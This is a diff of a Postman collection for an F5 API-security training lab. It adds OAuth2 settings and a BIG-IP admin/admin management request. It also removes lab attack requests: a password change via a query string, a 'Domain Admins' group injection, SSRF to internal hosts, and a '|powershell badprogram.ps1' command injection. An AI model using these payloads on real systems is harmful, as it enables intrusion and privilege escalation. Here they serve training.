@@ -1,12 +1,72 @@
 {
 	"info": {
-		"_postman_id": "ea993865-2f33-4b22-9406-a220d1b79a97",
+		"_postman_id": "401d5b32-93c9-465c-8cef-ef359995e3da",
 		"name": "student-class3-module4-lab01",
 		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
 	},
 	"item": [
 		{
-			"name": "Request 1: Retrieve User Attributes without JWT",
+			"name": "Request 1: Retrieve Postman ClientID",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"var jsonData = pm.response.json();\r",
+							"\r",
+							"pm.collectionVariables.set(\"CLIENT_ID\",jsonData.items[0].clientId);\r",
+							"\r",
+							"pm.test(\"ClientID retrieved\", function () {\r",
+							"pm.response.to.have.status(200);\r",
+							"});\r",
+							"            \r",
+							"\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"auth": {
+					"type": "basic",
+					"basic": [
+						{
+							"key": "password",
+							"value": "admin",
+							"type": "string"
+						},
+						{
+							"key": "username",
+							"value": "admin",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://10.1.1.4/mgmt/tm/apm/oauth/oauth-client-app",
+					"protocol": "https",
+					"host": [
+						"10",
+						"1",
+						"1",
+						"4"
+					],
+					"path": [
+						"mgmt",
+						"tm",
+						"apm",
+						"oauth",
+						"oauth-client-app"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 2: Retrieve User Attributes without JWT",
 			"request": {
 				"auth": {
 					"type": "noauth"
@@ -35,24 +95,59 @@
 			"response": []
 		},
 		{
-			"name": "Request 2: Retrieve User Attributes with JWT",
+			"name": "Request 3: Retrieve User Attributes with JWT",
 			"request": {
 				"auth": {
 					"type": "oauth2",
 					"oauth2": [
+						{
+							"key": "tokenName",
+							"value": "user1",
+							"type": "string"
+						},
+						{
+							"key": "clientId",
+							"value": "{{CLIENT_ID}}",
+							"type": "string"
+						},
+						{
+							"key": "accessTokenUrl",
+							"value": "https://as.acme.com/f5-oauth2/v1/token",
+							"type": "string"
+						},
+						{
+							"key": "authUrl",
+							"value": "https://as.acme.com/f5-oauth2/v1/authorize",
+							"type": "string"
+						},
+						{
+							"key": "redirect_uri",
+							"value": "https://www.getpostman.com/oauth2/callback",
+							"type": "string"
+						},
+						{
+							"key": "grant_type",
+							"value": "authorization_code",
+							"type": "string"
+						},
+						{
+							"key": "client_authentication",
+							"value": "header",
+							"type": "string"
+						},
 						{
 							"key": "tokenType",
 							"value": "",
 							"type": "string"
 						},
 						{
-							"key": "accessToken",
-							"value": "",
+							"key": "addTokenTo",
+							"value": "header",
 							"type": "string"
 						},
 						{
-							"key": "addTokenTo",
-							"value": "header",
+							"key": "challengeAlgorithm",
+							"value": "S256",
 							"type": "string"
 						}
 					]
@@ -81,7 +176,7 @@
 			"response": []
 		},
 		{
-			"name": "Request 3: Update a Valid User Attribute",
+			"name": "Request 4: Update a Valid User Attribute",
 			"request": {
 				"auth": {
 					"type": "oauth2",
@@ -131,7 +226,7 @@
 			"response": []
 		},
 		{
-			"name": "Request 4: Update a Nonexistent User's Attribute",
+			"name": "Request 5: Update a Nonexistent User's Attribute",
 			"request": {
 				"auth": {
 					"type": "oauth2",
@@ -181,7 +276,7 @@
 			"response": []
 		},
 		{
-			"name": "Request 5: Update a Valid User Attribute with PUT",
+			"name": "Request 6: Update a Valid User Attribute with PUT",
 			"request": {
 				"auth": {
 					"type": "oauth2",
@@ -231,11 +326,56 @@
 			"response": []
 		},
 		{
-			"name": "Request 6: Create User",
+			"name": "Request 7: Create User",
 			"request": {
 				"auth": {
 					"type": "oauth2",
 					"oauth2": [
+						{
+							"key": "tokenName",
+							"value": "user2",
+							"type": "string"
+						},
+						{
+							"key": "challengeAlgorithm",
+							"value": "S256",
+							"type": "string"
+						},
+						{
+							"key": "redirect_uri",
+							"value": "https://www.getpostman.com/oauth2/callback",
+							"type": "string"
+						},
+						{
+							"key": "grant_type",
+							"value": "authorization_code",
+							"type": "string"
+						},
+						{
+							"key": "clientId",
+							"value": "{{CLIENT_ID}}",
+							"type": "string"
+						},
+						{
+							"key": "authUrl",
+							"value": "https://as.acme.com/f5-oauth2/v1/authorize",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						},
+						{
+							"key": "client_authentication",
+							"value": "header",
+							"type": "string"
+						},
+						{
+							"key": "accessTokenUrl",
+							"value": "https://as.acme.com/f5-oauth2/v1/token",
+							"type": "string"
+						},
 						{
 							"key": "accessToken",
 							"value": "",
@@ -244,11 +384,6 @@
 						{
 							"key": "tokenType",
 							"value": "Bearer",
-							"type": "string"
-						},
-						{
-							"key": "addTokenTo",
-							"value": "header",
 							"type": "string"
 						}
 					]
@@ -281,7 +416,7 @@
 			"response": []
 		},
 		{
-			"name": "Request 7: Request Invalid Endpoint",
+			"name": "Request 8: Request Invalid Endpoint",
 			"request": {
 				"auth": {
 					"type": "oauth2",
@@ -323,7 +458,7 @@
 			"response": []
 		},
 		{
-			"name": "Request8: Create DNS Entry",
+			"name": "Request 9: Create DNS Entry",
 			"request": {
 				"auth": {
 					"type": "oauth2",
@@ -365,240 +500,56 @@
 				}
 			},
 			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
 		},
 		{
-			"name": "Request9: Retrieve Phone and Mail Attributes",
-			"request": {
-				"method": "GET",
-				"header": [],
-				"url": {
-					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser",
-					"protocol": "https",
-					"host": [
-						"api",
-						"acme",
-						"com"
-					],
-					"path": [
-						"vulnerable"
-					],
-					"query": [
-						{
-							"key": "useridentity",
-							"value": "hackeduser"
-						}
-					]
-				}
-			},
-			"response": []
-		},
-		{
-			"name": "Request10: Change Password",
-			"request": {
-				"method": "GET",
-				"header": [],
-				"url": {
-					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&password=letmein",
-					"protocol": "https",
-					"host": [
-						"api",
-						"acme",
-						"com"
-					],
-					"path": [
-						"vulnerable"
-					],
-					"query": [
-						{
-							"key": "useridentity",
-							"value": "hackeduser"
-						},
-						{
-							"key": "password",
-							"value": "letmein"
-						}
-					]
-				}
-			},
-			"response": []
-		},
-		{
-			"name": "Request11: Update Groups",
-			"request": {
-				"method": "GET",
-				"header": [],
-				"url": {
-					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&memberof=Domain Admins",
-					"protocol": "https",
-					"host": [
-						"api",
-						"acme",
-						"com"
-					],
-					"path": [
-						"vulnerable"
-					],
-					"query": [
-						{
-							"key": "useridentity",
-							"value": "hackeduser"
-						},
-						{
-							"key": "memberof",
-							"value": "Domain Admins"
-						}
-					]
-				}
-			},
-			"response": []
-		},
-		{
-			"name": "Request 12: Retrieve CN",
-			"request": {
-				"method": "GET",
-				"header": [],
-				"url": {
-					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&cn=",
-					"protocol": "https",
-					"host": [
-						"api",
-						"acme",
-						"com"
-					],
-					"path": [
-						"vulnerable"
-					],
-					"query": [
-						{
-							"key": "useridentity",
-							"value": "hackeduser"
-						},
-						{
-							"key": "cn",
-							"value": ""
-						}
-					]
-				}
-			},
-			"response": []
-		},
-		{
-			"name": "Request 13: SSRF Attack - Dummy",
-			"request": {
-				"method": "GET",
-				"header": [],
-				"url": {
-					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&uri=http://dummy.restapiexample.com/api/v1/employees",
-					"protocol": "https",
-					"host": [
-						"api",
-						"acme",
-						"com"
-					],
-					"path": [
-						"vulnerable"
-					],
-					"query": [
-						{
-							"key": "useridentity",
-							"value": "hackeduser"
-						},
-						{
-							"key": "uri",
-							"value": "http://dummy.restapiexample.com/api/v1/employees"
-						}
-					]
-				}
-			},
-			"response": []
-		},
-		{
-			"name": "Request 14: SSRF Attack - unprotected-json",
-			"request": {
-				"method": "GET",
-				"header": [],
-				"url": {
-					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&uri=http://unprotected-json.f5lab.local/",
-					"protocol": "https",
-					"host": [
-						"api",
-						"acme",
-						"com"
-					],
-					"path": [
-						"vulnerable"
-					],
-					"query": [
-						{
-							"key": "useridentity",
-							"value": "hackeduser"
-						},
-						{
-							"key": "uri",
-							"value": "http://unprotected-json.f5lab.local/"
-						}
-					]
-				}
-			},
-			"response": []
-		},
-		{
-			"name": "Request 15: Inject PowerShell",
-			"request": {
-				"method": "GET",
-				"header": [],
-				"url": {
-					"raw": "https://api.acme.com/vulnerable?inject=|powershell badprogram.ps1",
-					"protocol": "https",
-					"host": [
-						"api",
-						"acme",
-						"com"
-					],
-					"path": [
-						"vulnerable"
-					],
-					"query": [
-						{
-							"key": "inject",
-							"value": "|powershell badprogram.ps1"
-						}
-					]
-				}
-			},
-			"response": []
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
 		}
 	],
 	"variable": [
 		{
 			"key": "PRIOR_RESPONSE",
-			"value": "",
-			"type": "string"
+			"value": ""
 		},
 		{
 			"key": "APP_NAME",
-			"value": "",
-			"type": "string"
+			"value": ""
 		},
 		{
 			"key": "PARTITION_NAME",
-			"value": "",
-			"type": "string"
+			"value": ""
 		},
 		{
 			"key": "PATH_NAME",
-			"value": "",
-			"type": "string"
+			"value": ""
 		},
 		{
 			"key": "DNS_RESOLVER_NAME",
-			"value": "",
-			"type": "string"
+			"value": ""
 		},
 		{
 			"key": "CLIENT_SSL_NAME",
-			"value": "",
-			"type": "string"
+			"value": ""
+		},
+		{
+			"key": "CLIENT_ID",
+			"value": ""
 		}
 	]
 }
